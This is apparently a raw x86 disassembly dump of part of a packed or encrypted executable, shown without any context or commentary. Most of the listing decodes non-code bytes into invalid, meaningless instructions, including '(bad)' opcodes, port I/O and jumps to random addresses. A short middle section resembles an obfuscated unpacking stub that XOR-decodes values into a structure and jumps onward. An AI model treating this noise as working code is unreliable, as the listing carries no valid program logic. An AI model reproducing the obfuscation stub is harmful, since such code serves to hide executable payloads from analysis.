  4137ec:	push   ecx
  4137ed:	dec    ebp
  4137ee:	lods   al,BYTE PTR ds:[esi]
  4137ef:	pop    edi
  4137f0:	xlat   BYTE PTR ds:[ebx]
  4137f1:	das    
  4137f2:	test   eax,0xd1d6e369
  4137f7:	out    0x84,eax
  4137f9:	push   0x1630e2d4
  4137fe:	loope  0x413863
  413800:	xor    eax,DWORD PTR [ebx+0x4b]
  413803:	out    0x49,eax
  413805:	ror    DWORD PTR [esi+0x135e785],cl
  41380b:	mov    ah,0x2a
  41380d:	(bad)  
  41380f:	(bad)  
  413810:	(bad)  
  413812:	es or  al,cl
  413815:	and    al,BYTE PTR [edi]
  413817:	out    0x31,al
  413819:	mov    dh,0x87
  41381b:	idiv   DWORD PTR [esi-0x36eb8b4d]
  413821:	addr16 mov ecx,esi
  413824:	ficomp WORD PTR [ebp-0x2d039c59]
  41382a:	in     al,0x2c
  41382c:	ins    BYTE PTR es:[edi],dx
  41382d:	push   ebp
  41382e:	imul   BYTE PTR [edx]
  413830:	(bad)  
  413831:	mov    ebp,0xa1ee955
  413836:	jmp    0x310acd6a
  41383b:	fldenv [ebp+0x3341b3c8]
  413841:	daa    
  413842:	jl     0x413813
  413844:	ja     0x41387b
  413846:	add    BYTE PTR [esi],ah
  413848:	dec    eax
  413849:	in     al,dx
  41384a:	or     al,0xc5
  41384c:	xor    edi,DWORD PTR [ebx-0x23119d51]
  413852:	aas    
  413853:	jbe    0x4137e6
  413855:	xor    ecx,esp
  413857:	mov    eax,ds:0xb2714c42
  41385c:	xchg   BYTE PTR [ebx],dl
  41385e:	inc    bx
  413860:	sbb    DWORD PTR [ebx-0x1a],esp
  413863:	sbb    DWORD PTR [ebx],0x69e8a64e
  413869:	retf   0x7f3c
  41386c:	xchg   DWORD PTR [eax+eiz*2],edx
  41386f:	in     al,dx
  413870:	out    0x74,al
  413872:	ret    0xc7d1
  413875:	mov    ecx,0xe5fea596
  41387a:	push   esi
  41387b:	and    esi,DWORD PTR ds:0x29338dd
  413881:	xchg   esi,eax
  413882:	int    0xbe
  413884:	scas   al,BYTE PTR es:[edi]
  413885:	sub    ah,0xe
  413888:	cmp    DWORD PTR [esi],ecx
  41388a:	sbb    BYTE PTR [ebx+0x48],dh
  41388d:	fnstsw WORD PTR [ebp+ebx*4+0x39]
  413891:	aam    0x9f
  413893:	mov    esp,0xcfae1eee
  413898:	or     DWORD PTR [ebp+0x1a62a797],eax
  41389e:	jp     0x413886
  4138a0:	mov    DWORD PTR [ebx+0x171f65c5],0x35f48911
  4138aa:	frstor [esi-0x39]
  4138ad:	cwde   
  4138ae:	jl     0x4138a7
  4138b0:	pop    ebp
  4138b1:	push   eax
  4138b2:	mov    esi,es
  4138b4:	push   eax
  4138b5:	inc    ebp
  4138b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138b7:	push   edx
  4138b8:	repz mov ecx,?
  4138bb:	cmp    eax,0x26fc2dce
  4138c0:	mov    edi,0x407cedbf
  4138c5:	mov    ebx,0xa76e1464
  4138ca:	cmp    BYTE PTR [esi+edi*2+0x28],0xf4
  4138cf:	mov    ebx,0x6532304a
  4138d4:	mov    al,ds:0x3bb38463
  4138d9:	fs mov al,0xa9
  4138dc:	pop    eax
  4138dd:	mov    esi,0xcaf49cb6
  4138e2:	pop    esp
  4138e3:	or     BYTE PTR es:[esi+ebp*2-0x14],bl
  4138e8:	xchg   esp,eax
  4138e9:	mov    ecx,0xceba8645
  4138ee:	pop    eax
  4138ef:	sub    edi,DWORD PTR ds:0xd464732c
  4138f5:	inc    eax
  4138f6:	jo     0x413960
  4138f8:	div    DWORD PTR [ebx-0x78]
  4138fb:	sahf   
  4138fc:	inc    edx
  4138fd:	xor    eax,0x1b51dbab
  413902:	rol    dh,0x2c
  413905:	push   es
  413906:	cld    
  413907:	ds test dh,dh
  41390a:	xchg   esp,eax
  41390b:	pop    esp
  41390c:	popa   
  41390d:	mov    fs,WORD PTR [eax-0x52]
  413910:	jle    0x4138c6
  413912:	sahf   
  413913:	fs push esi
  413915:	xor    eax,0xf0ea2c41
  41391a:	pop    ebp
  41391b:	push   ebp
  41391c:	add    eax,0x6a6cb74a
  413921:	pop    ebp
  413922:	retf   
  413923:	retf   
  413924:	mov    ?,WORD PTR [edi]
  413926:	adc    DWORD PTR [eax-0x51],ecx
  413929:	adc    al,0x1f
  41392b:	leave  
  41392c:	jmp    0xe1da:0xc375f6d6
  413933:	push   esp
  413934:	(bad)  
  413935:	cli    
  413936:	ins    BYTE PTR es:[edi],dx
  413937:	xchg   ebp,eax
  413938:	push   es
  413939:	es cmp esi,ebp
  41393c:	dec    esp
  41393d:	jne    0x413929
  41393f:	or     esp,DWORD PTR [esi+0x451af42c]
  413945:	hlt    
  413946:	xchg   esi,eax
  413947:	push   eax
  413948:	fiadd  DWORD PTR [ebp+eax*2+0x0]
  41394c:	mov    dl,BYTE PTR [edx+ecx*4]
  41394f:	hlt    
  413950:	and    BYTE PTR [eax+0x75083b18],al
  413956:	out    0xd,eax
  413958:	sub    al,BYTE PTR [edi-0x26]
  41395b:	stc    
  41395c:	outs   dx,BYTE PTR ds:[esi]
  41395e:	push   edi
  41395f:	sbb    esp,DWORD PTR [ebx]
  413961:	lea    ebp,[esi]
  413963:	jmp    0x9f3de950
  413968:	dec    esp
  413969:	sbb    edi,DWORD PTR [eax]
  41396b:	cs int 0x14
  41396e:	sub    cl,BYTE PTR [ebx]
  413970:	jo     0x4139a6
  413972:	aad    0xdc
  413974:	scas   al,BYTE PTR es:[di]
  413976:	test   eax,0x73fb2517
  41397b:	outs   dx,DWORD PTR ds:[esi]
  41397c:	test   eax,0x8648dd7b
  413981:	mov    bl,0xfb
  413983:	lds    ebp,FWORD PTR [ecx]
  413985:	out    0x28,eax
  413987:	fidivr DWORD PTR [ecx+0xba93bfc]
  41398d:	push   ss
  41398e:	outs   dx,DWORD PTR ds:[esi]
  41398f:	adc    DWORD PTR [edi-0x78],esp
  413992:	leave  
  413993:	sbb    ch,ch
  413995:	cmp    esi,DWORD PTR [edi-0x71]
  413998:	ss xchg edi,eax
  41399a:	neg    BYTE PTR ds:0x17c0401b
  4139a0:	loope  0x4139ed
  4139a2:	and    eax,0x97980c9a
  4139a7:	mov    bl,BYTE PTR [ebx]
  4139a9:	int    0xc8
  4139ab:	ret    
  4139ac:	(bad)  
  4139ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139af:	or     eax,0x85e61f6
  4139b4:	pop    edx
  4139b5:	ins    BYTE PTR es:[edi],dx
  4139b6:	cld    
  4139b7:	sbb    eax,0xa9bd9637
  4139bc:	mov    dl,0x86
  4139be:	jle    0x413944
  4139c0:	mov    bh,0x9c
  4139c2:	cmp    al,0x26
  4139c4:	hlt    
  4139c5:	fsub   QWORD PTR cs:[esi-0x64]
  4139c9:	arpl   WORD PTR [edx],sp
  4139cb:	ja     0x4139bc
  4139cd:	je     0x413a02
  4139cf:	nop
  4139d0:	add    DWORD PTR [ecx+esi*2-0x20e9187b],esi
  4139d7:	mov    cl,0xea
  4139d9:	sahf   
  4139da:	lds    ebp,FWORD PTR [ebx]
  4139dc:	xchg   BYTE PTR [esi],cl
  4139de:	and    ecx,esi
  4139e0:	mov    ch,0x21
  4139e2:	sti    
  4139e3:	icebp  
  4139e4:	(bad)  
  4139e5:	mov    edi,0xf16b6499
  4139ea:	mov    ah,0x6d
  4139ec:	js     0x413a31
  4139ee:	push   ebx
  4139ef:	push   ecx
  4139f0:	ret    
  4139f1:	push   cs
  4139f2:	hlt    
  4139f3:	loop   0x413a66
  4139f5:	ret    
  4139f6:	aad    0xdb
  4139f8:	mov    cx,0xf9fe
  4139fc:	je     0x413a02
  4139fe:	scas   al,BYTE PTR es:[edi]
  4139ff:	jle    0x413a40
  413a01:	push   ds
  413a02:	(bad)  
  413a03:	xor    DWORD PTR [esi+0x598a0fb4],edx
  413a09:	dec    ecx
  413a0a:	jbe    0x413a43
  413a0c:	jo     0x4139a7
  413a0e:	mov    ecx,0x40f87b4e
  413a13:	pusha  
  413a14:	cmp    ebp,DWORD PTR [edx-0x319eb7e9]
  413a1a:	sub    eax,0x89aa8d79
  413a1f:	jae    0x413a70
  413a21:	rcr    BYTE PTR [ecx],0x7
  413a24:	leave  
  413a25:	mov    edi,0x477f8b17
  413a2a:	jg     0x413a43
  413a2c:	adc    BYTE PTR [edi+0x3826f7ae],dh
  413a32:	dec    esp
  413a33:	dec    eax
  413a34:	bound  eax,QWORD PTR [edi]
  413a36:	cwde   
  413a37:	cmp    edx,DWORD PTR [ebx+edi*2+0x27]
  413a3b:	sbb    al,0xbf
  413a3d:	loop   0x4139c1
  413a3f:	aas    
  413a40:	and    DWORD PTR [ebx-0xc42e6d3],eax
  413a46:	push   0x7dd4b417
  413a4b:	shl    DWORD PTR [eax+0x779a05c6],1
  413a51:	lods   al,BYTE PTR ds:[esi]
  413a52:	jmp    0x4239356a
  413a57:	jbe    0x4139db
  413a59:	and    DWORD PTR [ebx-0x38],0xfe70e74a
  413a60:	popf   
  413a61:	loop   0x4139f9
  413a63:	or     DWORD PTR [edi-0x6c06b034],ecx
  413a69:	mov    ch,0xfd
  413a6b:	pop    edx
  413a6c:	sbb    al,0x60
  413a6e:	jne    0x413add
  413a70:	mov    ds:0xc63d9bf2,al
  413a75:	and    edx,ecx
  413a77:	mov    ecx,0x1f752e29
  413a7c:	jge    0x413a6f
  413a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a7f:	into   
  413a80:	sahf   
  413a81:	test   BYTE PTR [eiz*1+0x2f406fab],ch
  413a88:	out    0xc7,al
  413a8a:	call   0x9072:0xc0c996ee
  413a91:	mov    eax,?
  413a93:	sbb    ah,BYTE PTR [edx]
  413a95:	idiv   BYTE PTR [ebx]
  413a97:	push   ds
  413a98:	call   DWORD PTR [ecx-0x41]
  413a9b:	cwde   
  413a9c:	xchg   BYTE PTR fs:[edx],al
  413a9f:	fbstp  TBYTE PTR ds:0x2bc8bb4d
  413aa5:	inc    eax
  413aa6:	lods   al,BYTE PTR ds:[esi]
  413aa7:	jo     0x413ac1
  413aa9:	(bad)  
  413aaa:	jne    0x413a65
  413aac:	(bad)  
  413aad:	and    edi,eax
  413aaf:	dec    edx
  413ab0:	ret    
  413ab1:	imul   ebp,DWORD PTR [ebp+0x779b8fc3],0x344a3836
  413abb:	leave  
  413abc:	mov    ebx,0xe8974906
  413ac1:	mov    bl,0x7b
  413ac3:	or     BYTE PTR [eax+edi*1-0x22],al
  413ac7:	cmp    BYTE PTR [eax],bl
  413ac9:	call   0x3e5e6374
  413ace:	shl    DWORD PTR [esp+eax*4-0x7d],1
  413ad2:	aam    0xf8
  413ad4:	inc    esi
  413ad5:	dec    ebp
  413ad6:	jb     0x413ab9
  413ad8:	loope  0x413ac1
  413ada:	ss cmc 
  413adc:	xchg   DWORD PTR [esi],eax
  413ade:	aam    0x45
  413ae0:	push   ebx
  413ae1:	cmp    BYTE PTR [ecx+0x3b1ccaf1],0xb4
  413ae8:	inc    edx
  413ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aea:	mov    esi,0xdd6ee4f7
  413aef:	mov    dl,0x91
  413af1:	inc    esp
  413af2:	mov    bl,0x52
  413af4:	jge    0x413b35
  413af6:	and    dh,ch
  413af8:	push   ebp
  413af9:	scas   eax,DWORD PTR es:[edi]
  413afa:	mov    edi,0xce488fda
  413aff:	and    DWORD PTR [ecx-0x7ad2fc31],edi
  413b05:	sar    BYTE PTR [eax],0x6a
  413b08:	xchg   esi,eax
  413b09:	es data16 in al,0x24
  413b0d:	pop    ds
  413b0e:	pop    ecx
  413b0f:	mov    cl,0x2c
  413b11:	in     al,0x63
  413b13:	and    esi,DWORD PTR [esi+0x6fac2728]
  413b19:	test   eax,0x4bffb71e
  413b1e:	mov    dh,BYTE PTR [ebx]
  413b20:	xor    eax,0xf72c1800
  413b25:	cli    
  413b26:	cdq    
  413b27:	inc    esi
  413b28:	test   al,0xf3
  413b2a:	stc    
  413b2b:	data16 scas al,BYTE PTR es:[edi]
  413b2d:	jge    0x413b04
  413b2f:	jl     0x413b28
  413b31:	jne    0x413b3b
  413b33:	mov    bh,0xe4
  413b35:	adc    DWORD PTR [esp+eax*4-0x169919da],ecx
  413b3c:	ss in  al,0x9a
  413b3f:	lods   al,BYTE PTR ds:[esi]
  413b40:	das    
  413b41:	mov    edi,0x7bf3ef22
  413b46:	into   
  413b47:	repz mov esi,0x7ff6c9f6
  413b4d:	inc    ebx
  413b4e:	cmp    eax,0xa193149e
  413b53:	icebp  
  413b54:	fimul  DWORD PTR [ebx]
  413b56:	adc    DWORD PTR [edx+0x180a37d5],edx
  413b5c:	lea    edx,[eax+edi*4]
  413b5f:	jle    0x413aec
  413b61:	jle    0x413bbc
  413b63:	into   
  413b64:	jp     0x413bab
  413b66:	jmp    0xa4b3772e
  413b6b:	das    
  413b6c:	sar    BYTE PTR [edx],1
  413b6e:	cmp    ebx,DWORD PTR [esp+ebp*8-0x4b]
  413b72:	or     al,0xa4
  413b74:	inc    esp
  413b75:	scas   eax,DWORD PTR es:[edi]
  413b76:	les    ebx,FWORD PTR [eax-0x7a92e6b0]
  413b7c:	push   cs
  413b7d:	cs and eax,0x633175d1
  413b83:	fs out 0xd9,eax
  413b86:	daa    
  413b87:	fisubr WORD PTR [ebp-0x13]
  413b8a:	pop    ecx
  413b8b:	or     al,0xff
  413b8d:	call   0x71a3:0xa4ea1827
  413b94:	inc    esi
  413b95:	das    
  413b96:	jmp    0x413bb2
  413b98:	call   0xe275:0x574381d7
  413b9f:	add    eax,0xa102624
  413ba4:	cmp    al,0x8c
  413ba6:	push   ecx
  413ba7:	inc    eax
  413ba8:	cs sti 
  413baa:	fwait
  413bab:	outs   dx,DWORD PTR ds:[esi]
  413bac:	push   cs
  413bad:	dec    ebp
  413bae:	push   edx
  413baf:	adc    BYTE PTR [eax+0x7],ah
  413bb2:	enter  0xdb56,0xc9
  413bb6:	jb     0x413bdd
  413bb8:	pop    eax
  413bb9:	clc    
  413bba:	mov    edi,0x4e095977
  413bbf:	push   ecx
  413bc0:	out    0xb2,eax
  413bc2:	mov    ecx,0xb0487a21
  413bc7:	(bad)  
  413bc8:	out    dx,al
  413bc9:	aas    
  413bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bcb:	xchg   ecx,eax
  413bcc:	inc    esi
  413bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bce:	pop    ebx
  413bcf:	mov    ebx,0x98a2a018
  413bd4:	fldcw  WORD PTR [edi-0x3f]
  413bd7:	das    
  413bd8:	xchg   bh,ah
  413bda:	fcomp  DWORD PTR [esp+eiz*4]
  413bdd:	(bad)  
  413bde:	fbld   TBYTE PTR [edx]
  413be0:	cmp    BYTE PTR [ebx-0x410c965d],dl
  413be6:	jnp    0x413c4b
  413be8:	pop    ebp
  413be9:	std    
  413bea:	clc    
  413beb:	js     0x413c62
  413bed:	push   edx
  413bee:	loopne 0x413c61
  413bf0:	pop    edx
  413bf1:	dec    ecx
  413bf2:	or     DWORD PTR [edi],esp
  413bf4:	scas   eax,DWORD PTR es:[edi]
  413bf5:	aaa    
  413bf6:	dec    ebp
  413bf7:	data16 stc 
  413bf9:	pop    edi
  413bfa:	dec    ecx
  413bfb:	inc    ebp
  413bfc:	lods   eax,DWORD PTR ds:[esi]
  413bfd:	shr    DWORD PTR [ebx-0x49],cl
  413c00:	lods   eax,DWORD PTR ds:[esi]
  413c01:	fdivr  QWORD PTR [ecx-0x28cdc789]
  413c07:	pop    ss
  413c08:	adc    dl,dh
  413c0a:	fs aas 
  413c0c:	xor    eax,0x37b0837b
  413c11:	and    edi,eax
  413c13:	lahf   
  413c14:	dec    eax
  413c15:	icebp  
  413c16:	inc    eax
  413c17:	retf   
  413c18:	clc    
  413c19:	and    al,0x10
  413c1b:	push   eax
  413c1c:	mov    bh,0xc9
  413c1e:	neg    DWORD PTR [ecx]
  413c20:	icebp  
  413c21:	ret    0xd508
  413c24:	pop    esp
  413c25:	dec    eax
  413c26:	adc    esp,edi
  413c28:	enter  0xab98,0x75
  413c2c:	pop    ecx
  413c2d:	repnz dec ebp
  413c2f:	outs   dx,DWORD PTR ds:[esi]
  413c30:	mov    bl,0xa3
  413c32:	cmp    BYTE PTR [eax],dh
  413c34:	test   DWORD PTR [edi-0x57],esp
  413c37:	sub    ebx,ebp
  413c39:	iret   
  413c3a:	stc    
  413c3b:	cmp    ah,BYTE PTR [eax]
  413c3d:	jecxz  0x413c4e
  413c3f:	dec    ecx
  413c40:	inc    edi
  413c41:	or     eax,0xbe4d0495
  413c46:	imul   ecx,esi,0xffffff92
  413c49:	mov    bl,0xab
  413c4b:	cmp    esi,DWORD PTR [esi]
  413c4d:	cdq    
  413c4e:	test   al,ah
  413c50:	push   ds
  413c51:	cli    
  413c52:	xchg   ebp,eax
  413c53:	imul   eax,DWORD PTR [ecx+0x65c5184f],0xfffffffa
  413c5a:	push   esi
  413c5b:	sbb    DWORD PTR [ebp-0x5ad82ab],ebx
  413c61:	shl    DWORD PTR [edi+ebx*4],1
  413c64:	js     0x413cdd
  413c66:	lods   eax,DWORD PTR ds:[esi]
  413c67:	nop
  413c68:	std    
  413c69:	jmp    0x413c11
  413c6b:	loopne 0x413c76
  413c6d:	dec    esi
  413c6e:	sbb    cl,BYTE PTR [edi]
  413c70:	dec    ecx
  413c71:	xchg   ecx,eax
  413c72:	sbb    esp,DWORD PTR [eax+eiz*2]
  413c75:	dec    eax
  413c76:	sub    al,0x1c
  413c78:	pop    edx
  413c79:	mov    esi,gs
  413c7b:	lock inc eax
  413c7d:	cmp    BYTE PTR [esi-0x68],ch
  413c80:	rcr    BYTE PTR [edi+0x69],cl
  413c83:	div    BYTE PTR [edx+edi*4]
  413c86:	mov    ah,0x38
  413c88:	imul   esi,DWORD PTR [edx-0x3c],0x27ea05fe
  413c8f:	inc    esi
  413c90:	lods   al,BYTE PTR ds:[esi]
  413c91:	adc    dl,BYTE PTR [esi+0x5c]
  413c94:	sub    DWORD PTR [ebp+0x5a16fed6],ebp
  413c9a:	daa    
  413c9b:	loope  0x413cf9
  413c9d:	push   ecx
  413c9e:	(bad)  
  413c9f:	mov    ah,0xbf
  413ca1:	xor    bh,BYTE PTR [eax+0x33f9a8d2]
  413ca7:	scas   eax,DWORD PTR es:[edi]
  413ca8:	js     0x413ce4
  413caa:	ret    
  413cab:	ror    BYTE PTR [edi],cl
  413cad:	mov    eax,0x4d425ee5
  413cb2:	nop
  413cb3:	jecxz  0x413ca8
  413cb5:	test   al,0x3b
  413cb7:	pop    edi
  413cb8:	call   0x8acb:0x12c0ddc8
  413cbf:	test   bh,0x59
  413cc2:	mov    edx,0x81c9756d
  413cc7:	xchg   edx,eax
  413cc8:	aad    0x70
  413cca:	stos   BYTE PTR es:[edi],al
  413ccb:	pop    ds
  413ccc:	cmc    
  413ccd:	mov    esp,ebx
  413ccf:	jmp    0xd67f:0x5acf83d
  413cd6:	pusha  
  413cd7:	std    
  413cd8:	jo     0x413d52
  413cda:	daa    
  413cdb:	retf   
  413cdc:	pop    ss
  413cdd:	or     ebx,esp
  413cdf:	add    al,0x84
  413ce1:	jnp    0x413c7f
  413ce3:	and    ecx,ebx
  413ce5:	mov    esi,0x37f124c1
  413cea:	add    ebx,DWORD PTR [ecx+0x4]
  413ced:	scas   eax,DWORD PTR es:[edi]
  413cee:	adc    eax,0xee65c318
  413cf3:	xor    BYTE PTR [ebx+ecx*2],al
  413cf6:	retf   
  413cf7:	mov    ah,0xf7
  413cf9:	js     0x413d45
  413cfb:	mov    esp,0x6d6f2e9f
  413d00:	sbb    esi,DWORD PTR [edx+0x20]
  413d03:	ss jo  0x413d29
  413d06:	add    al,0x58
  413d08:	nop
  413d09:	xchg   esi,ecx
  413d0b:	push   ecx
  413d0c:	inc    eax
  413d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d0e:	push   edx
  413d0f:	add    BYTE PTR es:[edx+0x5],ch
  413d13:	icebp  
  413d14:	sbb    al,0x77
  413d16:	push   0xffffffec
  413d18:	(bad)  
  413d1a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d1c:	xchg   DWORD PTR [eax-0x1fc128df],esp
  413d22:	clc    
  413d23:	test   DWORD PTR [esp+eiz*4],0xefe5d458
  413d2a:	sub    DWORD PTR [esi+eax*8],esi
  413d2d:	mov    DWORD PTR [edx-0x45],edi
  413d30:	in     al,dx
  413d31:	sbb    BYTE PTR [eax+0x44],0x2e
  413d35:	push   ebx
  413d36:	adc    DWORD PTR [edx],esp
  413d38:	cmp    eax,eax
  413d3a:	test   BYTE PTR [ebp-0x40],al
  413d3d:	or     al,0x10
  413d3f:	fiadd  DWORD PTR [ebp+0x59bef7ec]
  413d45:	lods   eax,DWORD PTR ds:[esi]
  413d46:	adc    DWORD PTR [edx+0x55c2c89d],ebp
  413d4c:	push   edi
  413d4d:	xor    DWORD PTR [esi],edi
  413d4f:	hlt    
  413d50:	fiadd  DWORD PTR [ebp+0x6f]
  413d53:	idiv   DWORD PTR [esi-0x42aa9807]
  413d59:	stc    
  413d5a:	mov    DWORD PTR [ebx+0x0],esp
  413d5d:	not    BYTE PTR [edx]
  413d5f:	mov    WORD PTR [eax],fs
  413d61:	ja     0x413d9a
  413d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d64:	aaa    
  413d65:	jbe    0x413d88
  413d67:	pop    es
  413d68:	sbb    esi,DWORD PTR [ebx]
  413d6a:	or     edx,DWORD PTR [ebp+0x2056d640]
  413d70:	test   DWORD PTR [edx+0x10],esp
  413d73:	lock jmp 0xb67a:0x8daab3a3
  413d7b:	fld    TBYTE PTR [eax]
  413d7d:	inc    ecx
  413d7e:	sub    ebx,ecx
  413d80:	xchg   ebx,ecx
  413d82:	dec    ecx
  413d83:	dec    ecx
  413d84:	mov    eax,DWORD PTR [ebp-0x1c]
  413d87:	imul   eax,ecx
  413d8a:	add    esp,eax
  413d8c:	xchg   edx,eax
  413d8d:	push   eax
  413d8e:	xor    ebx,ebx
  413d90:	mov    edx,esp
  413d92:	dec    edx
  413d93:	inc    ebx
  413d94:	add    ebx,DWORD PTR [edx+ebx*1]
  413d97:	dec    ebx
  413d98:	xor    edx,edx
  413d9a:	add    DWORD PTR [ebp-0x10],ebx
  413d9d:	pop    ebx
  413d9e:	mov    eax,DWORD PTR [ebp-0x10]
  413da1:	pop    edi
  413da2:	pop    esi
  413da3:	pop    ebx
  413da4:	leave  
  413da5:	ret    0x10
  413da8:	push   ebp
  413da9:	mov    ebp,esp
  413dab:	push   ecx
  413dac:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  413db3:	sub    DWORD PTR ds:0x42a2e6,ebx
  413db9:	mov    eax,DWORD PTR [ebp-0x4]
  413dbc:	and    DWORD PTR ds:0x42a2e6,0x0
  413dc6:	jmp    0x413dd8
  413dcb:	mov    edx,DWORD PTR ds:0x42a2e6
  413dd1:	inc    edx
  413dd2:	mov    DWORD PTR ds:0x42a2e6,edx
  413dd8:	cmp    DWORD PTR ds:0x42a2e6,0x1a
  413ddf:	jae    0x413e0a
  413de5:	cmp    DWORD PTR ds:0x42a2e6,0x2a
  413dec:	ja     0x413e0a
  413df2:	jmp    0x413e05
  413df7:	push   DWORD PTR [ebp-0x10]
  413dfa:	push   0x42a27e
  413dff:	call   DWORD PTR ds:0x42a3ce
  413e05:	jmp    0x413dcb
  413e0a:	mov    edx,DWORD PTR [ebp+0x10]
  413e0d:	mov    ecx,0x75108aa
  413e12:	xor    eax,ecx
  413e14:	sbb    DWORD PTR ds:0x42a2aa,0x2976
  413e1e:	add    eax,0x3272f1
  413e23:	xor    DWORD PTR ds:0x42a272,0x42a2b6
  413e2d:	mov    DWORD PTR [edx],eax
  413e2f:	mov    eax,DWORD PTR [ebp+0xc]
  413e32:	and    edx,DWORD PTR ds:0x42a2f2
  413e38:	xor    eax,ecx
  413e3a:	and    DWORD PTR ds:0x42a2de,edi
  413e40:	push   esi
  413e41:	mov    esi,DWORD PTR [ebp+0x10]
  413e44:	mov    edx,0x3272f1
  413e49:	add    eax,edx
  413e4b:	mov    DWORD PTR [esi+0x4],eax
  413e4e:	mov    eax,DWORD PTR [ebp+0x14]
  413e51:	mov    esi,DWORD PTR [ebp+0x10]
  413e54:	mov    DWORD PTR [esi+0x8],eax
  413e57:	mov    eax,DWORD PTR [ebp+0x18]
  413e5a:	mov    esi,DWORD PTR [ebp+0x10]
  413e5d:	mov    DWORD PTR [esi+0xc],eax
  413e60:	mov    eax,DWORD PTR [ebp+0x1c]
  413e63:	mov    esi,DWORD PTR [ebp+0x10]
  413e66:	mov    DWORD PTR [esi+0x10],eax
  413e69:	mov    eax,DWORD PTR [ebp+0x8]
  413e6c:	xor    eax,ecx
  413e6e:	add    eax,edx
  413e70:	jmp    0x416225
  413e75:	mov    esi,ebx
  413e77:	push   ebx
  413e78:	push   esi
  413e79:	or     edx,esi
  413e7b:	xchg   BYTE PTR [esi+0x72f8d7bb],ch
  413e81:	jne    0x413e14
  413e83:	jecxz  0x413ebb
  413e85:	xchg   esp,eax
  413e86:	gs jl  0x413e0c
  413e89:	jmp    0x413ee9
  413e8b:	add    DWORD PTR [ebx+0x46270162],0x32
  413e92:	push   ds
  413e93:	dec    ebp
  413e94:	adc    DWORD PTR [ebp+0xf],0x10b1024a
  413e9b:	fcomp  DWORD PTR [ecx-0x7b12357d]
  413ea1:	hlt    
  413ea2:	test   al,0xd1
  413ea4:	out    0x65,eax
  413ea6:	jnp    0x413eff
  413ea8:	sub    BYTE PTR [edi-0x44],al
  413eab:	dec    edi
  413eac:	adc    eax,0x69f56c53
  413eb1:	je     0x413f2c
  413eb3:	mov    ah,BYTE PTR [ebx+0xade1daa]
  413eb9:	mov    esp,0x6e904aeb
  413ebe:	mov    BYTE PTR [esi+0x25],bl
  413ec1:	fwait
  413ec2:	cmp    eax,0x26336d43
  413ec7:	mov    bl,0xa7
  413ec9:	mov    eax,ds
  413ecb:	or     eax,0xa875ceb7
  413ed0:	loopne 0x413f3c
  413ed2:	imul   edx,DWORD PTR [eax-0x74],0xe09b71
  413ed9:	fld    DWORD PTR [edi-0x15]
  413edc:	call   0x758cf68c
  413ee1:	add    eax,0xfd8d2a35
  413ee6:	sub    edx,0xffffffcc
  413ee9:	imul   edx,DWORD PTR [edx+ebp*8],0xbb083815
  413ef0:	mov    eax,0x849e67d7
  413ef5:	loope  0x413f08
  413ef7:	jg     0x413f09
  413ef9:	outs   dx,DWORD PTR ds:[esi]
  413efa:	jmp    0x413f21
  413efc:	test   DWORD PTR [ebx+eiz*2+0x4d],ebp
  413f00:	mov    ds:0xa885990e,eax
  413f05:	pop    esi
  413f06:	out    dx,eax
  413f07:	mov    ch,0x46
  413f09:	mov    esi,0xfc0d4df0
  413f0e:	(bad)  
  413f0f:	jge    0x413ead
  413f11:	ja     0x413f84
  413f13:	into   
  413f14:	sbb    ch,BYTE PTR [esi+0x13]
  413f17:	daa    
  413f18:	punpcklbw mm1,DWORD PTR [eax-0x36ee1073]
  413f1f:	or     ebp,ebp
  413f21:	call   0xecc90e0d
  413f26:	xchg   edx,eax
  413f27:	jbe    0x413f5d
  413f29:	pop    ebp
  413f2a:	imul   esp,DWORD PTR [edx+0x1d],0x80efc2be
  413f31:	lods   eax,DWORD PTR ds:[esi]
  413f32:	mov    WORD PTR [edx-0x4d],gs
  413f35:	jl     0x413f4f
  413f37:	scas   eax,DWORD PTR es:[edi]
  413f38:	call   0x241:0xdb6db0ed
  413f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f40:	cmp    BYTE PTR [ebp-0x4a753023],ch
  413f46:	sub    eax,0xec6511b2
  413f4b:	and    ecx,ebx
  413f4d:	sbb    ah,BYTE PTR [ecx-0x4b]
  413f50:	dec    ecx
  413f51:	adc    edi,DWORD PTR [ecx-0x7a]
  413f54:	scas   eax,DWORD PTR es:[edi]
  413f55:	mov    ebx,0x7d0af814
  413f5a:	cdq    
  413f5b:	(bad)  
  413f5c:	sbb    DWORD PTR [edi-0x4fce6d76],ebp
  413f62:	call   0x9adbd195
  413f67:	in     eax,0xf3
  413f69:	sbb    al,dh
  413f6b:	xor    eax,DWORD PTR [eax+0x4]
  413f6e:	adc    eax,0x44024ed0
  413f73:	sti    
  413f74:	pop    ebp
  413f75:	mov    esi,0xc25bfbe6
  413f7a:	lea    eax,[edi-0x7362d45]
  413f80:	cli    
  413f81:	sub    dl,dl
  413f83:	dec    esi
  413f84:	ret    
  413f85:	mov    esp,0x87ddac7b
  413f8a:	pop    DWORD PTR [edi]
  413f8c:	iret   
  413f8d:	aas    
  413f8e:	pop    ecx
  413f8f:	test   al,0x48
  413f91:	repz out 0xc4,eax
  413f94:	add    eax,0xb8172b46
  413f99:	test   DWORD PTR [eax+0x8de2cba],ebx
  413f9f:	xor    eax,0x2acacb8
  413fa4:	sbb    edi,edi
  413fa6:	ret    
  413fa7:	add    al,0xd1
  413fa9:	inc    esp
  413faa:	cs ret 0xbd82
  413fae:	pushf  
  413faf:	xchg   edx,eax
  413fb0:	aad    0x75
  413fb2:	push   ebx
  413fb3:	ret    
  413fb4:	inc    ebx
  413fb5:	imul   esi,DWORD PTR [ecx+0x3],0xf5a3e1c7
  413fbc:	adc    DWORD PTR [esi+0x31],ebx
  413fbf:	dec    edi
  413fc0:	jnp    0x413faa
  413fc2:	fld    TBYTE PTR [ecx+0x1b]
  413fc5:	add    BYTE PTR [eax+0x7bc302ad],bl
  413fcb:	mov    ds:0x1e166b67,al
  413fd0:	push   0x9accad69
  413fd5:	call   0xbe9dd6ad
